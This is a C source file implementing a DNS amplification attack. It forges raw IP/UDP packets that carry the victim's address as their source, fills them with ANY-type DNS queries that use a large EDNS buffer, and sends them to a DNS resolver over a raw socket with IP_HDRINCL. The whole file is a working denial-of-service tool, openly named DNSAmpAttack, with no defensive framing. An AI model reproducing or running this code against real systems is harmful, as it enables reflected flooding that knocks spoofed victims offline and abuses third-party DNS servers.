#include "dns.h"

uint16_t checkSum(uint16_t * buffer, size_type nbytes){
	unsigned long sum = 0;
    // Accumulate checksum
	for(size_type i = 0; i < nbytes; i += 2){
        sum += *buffer++;
	}
    // Handle odd-sized case
	if (nbytes % 2){
		sum += *(uint8_t*)buffer;
	}
	// Add carry
	sum = (sum >> 16) + (sum & 0xffff);
	// Add additional carry
	sum += (sum >> 16);
	return (uint16_t)~sum;
}

void formatDNSName(char * buffer, const char * hostname){
    // www.google.com => 3www6google3com
    char record[100];
    strncpy(record, hostname, 100);
	strncat(record, ".", 2);
	for(size_type i = 0, j = 0; record[i]; ++i){
		if(record[i] == '.'){
			*buffer++ = i - j;
			for(; j < i; ++j){
				*buffer++ = record[j];
			}
			++j;
		}
	}
	*buffer++ = '\0';
}

size_type createDNSMessage(char * dns_message, const char * hostname, uint16_t record_type){
    // Create DNS header
    dns_header * dns = (dns_header *)dns_message;
    dns->id = htons(getpid());  // arbitrary unique id
    dns->flags = htons(0x0100); // recursion desired(rd)
    dns->qcount = htons(1);     // one question
    dns->answ = 0;
    dns->auth = 0;
    dns->addi = htons(1);
    // Create qname
    formatDNSName(dns_message + sizeof(dns_header), hostname);
    size_t qname_len = strlen( (const char *)(dns_message + sizeof(dns_header)) ) + 1;
    // Create qtype, qclass
    question* q = (question *)(dns_message + sizeof(dns_header) + qname_len);
    q->qtype = htons(record_type);
    q->qclass = htons(1); // internet(IN)
    // Additional info
    char *edns = (char *)(dns_message + sizeof(dns_header) + qname_len + sizeof(question)) + 1;
    memset(edns    , 0x00, 1);
    memset(edns + 1, 0x29, 1);
    memset(edns + 2, 0xFF, 2);
    memset(edns + 4, 0x00, 7);

    return sizeof(dns_header) + qname_len + sizeof(question) + 11;
}

void createIPHeader(ip_header * ip, const char * src_ip, const char * dst_ip, size_type data_len){
    ip->ip_v = IPVERSION;
    ip->ip_hl = 5;
    ip->ip_tos = IPTOS_PREC_ROUTINE;
    ip->ip_len = sizeof(ip_header) + data_len;
    ip->ip_id = htons(getpid());
    ip->ip_off = 0;
    ip->ip_ttl = MAXTTL;
    ip->ip_p = IPPROTO_UDP; // use UDP
    ip->ip_src.s_addr = inet_addr(src_ip);
    ip->ip_dst.s_addr = inet_addr(dst_ip);
	ip->ip_sum = checkSum((uint16_t *)ip, ip->ip_len);
}

void creatUDPHeader(udp_header * udp, int src_port, int dst_port, size_type data_len){
	udp->uh_sport = htons(src_port);
    udp->uh_dport = htons(dst_port);
    udp->uh_ulen = htons(sizeof(udp_header) + data_len);
    udp->uh_sum = 0; // update this value with IPv4CheckSum
}

void IPv4CheckSum(const ip_header * ip, udp_header * udp){
    size_type udp_len = ntohs(udp->uh_ulen);
    size_type ps_len = sizeof(ps_header) + udp_len;
	char * ps_data = malloc(ps_len);

    // Top part
    ps_header * ps = (ps_header *)ps_data;
    ps->ip_src = ip->ip_src.s_addr;
    ps->ip_dst = ip->ip_dst.s_addr;
    ps->zeroes = 0;
    ps->protocol = IPPROTO_UDP;
    ps->ulen = udp->uh_ulen;
    // Bottom part(udp header)
	memcpy(ps_data + sizeof(ps_header), udp, udp_len);
	// Caculate checksum
	udp->uh_sum = checkSum((uint16_t *)ps_data, ps_len);

	free(ps_data);
}

void DNSAmpAttack(const char * target_ip, int target_port, const char * dns_server_ip, const char * hostname){
    // Create datagram
    char datagram[4096];
    memset(datagram, 0, 4096);

    // Create DNS message
    char * dns = datagram + sizeof(ip_header) + sizeof(udp_header);
    size_t dns_message_len = createDNSMessage(dns, hostname, RECORD_ANY);

    // Create UDP header
    udp_header * udp = (udp_header *)(datagram + sizeof(ip_header));
    creatUDPHeader(udp, target_port, DNS_PORT, dns_message_len);

    // Create IP header
    ip_header * ip = (ip_header *)datagram;
    createIPHeader(ip, target_ip, dns_server_ip, sizeof(udp_header) + dns_message_len);

    // Calculate checksum
    IPv4CheckSum(ip, udp);

    // Setup sockaddr
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(DNS_PORT);
    sin.sin_addr.s_addr = inet_addr(dns_server_ip);

    // Create socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sock < 0){
        printf("Socket creation failed.\n");
    }

    // Set socket option
    // IPROTO_IP: top level protocol is IP
    // IP_HDRINCL: the application provides the IP header
    const int one = 1;
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0){
        printf("Setsockopt failed.\n");
    }

    // Send socket
    if(sendto(sock, datagram, ip->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
        printf("Transimission failed.\n");
    }else{
        printf("Transimission successful.\n");
    }

	close(sock);
}
